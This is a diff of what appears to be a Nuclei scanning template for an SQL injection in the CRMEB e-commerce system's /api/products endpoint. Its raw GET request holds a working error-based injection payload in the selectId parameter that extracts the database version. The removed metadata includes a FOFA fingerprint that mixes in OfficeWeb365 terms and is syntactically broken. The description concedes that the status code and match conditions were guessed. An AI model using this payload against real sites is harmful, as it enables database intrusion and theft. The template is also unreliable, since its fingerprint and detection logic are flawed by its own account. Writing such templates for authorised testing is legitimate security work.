@@ -3,14 +3,8 @@ info:
   name: CRMEB开源电商系统products SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qvcti4pat8eehkfl
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qvcti4pat8eehkfl
-    fofa: header="OfficeWeb365" || body="请输入furl参数"body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
 http:
 - raw:
   - 'GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
